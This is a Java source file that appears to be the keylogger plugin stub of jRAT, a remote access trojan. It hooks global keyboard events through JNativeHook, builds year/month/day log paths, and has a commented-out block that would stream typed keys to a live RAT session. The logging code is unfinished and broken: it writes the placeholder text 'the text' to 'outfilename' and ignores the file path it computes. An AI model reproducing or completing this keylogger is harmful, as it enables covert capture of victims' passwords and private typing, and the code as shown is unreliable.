package pro.jrat.plugin.stub;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.Date;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener {

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {		
		try {
			File file = getFile();
			
			PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter("outfilename", true)));
		    out.println("the text");
		    out.close();
			
			/*if (LIVE RUNNING && KeyloggerPlugin.dos != null) {
				Activities.add(new Key(arg0.getKeyChar()));
				System.out.println(arg0.getKeyChar());
			}*/
		} catch (Exception e) {
			System.err.println("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
		}

	}

	@SuppressWarnings("deprecation")
	private File getFile() {
		File mainDir = KeyloggerPlugin.getLogsRoot();
		
		Date date = new Date();
		
		File year = new File(mainDir, date.getYear() + "");
		year.mkdirs();
		
		File month = new File(year, (date.getMonth() + 1) + "");
		month.mkdirs();
		
		File day = new File(month, (date.getDate()) + ".log");
		
		return day;
	}

}
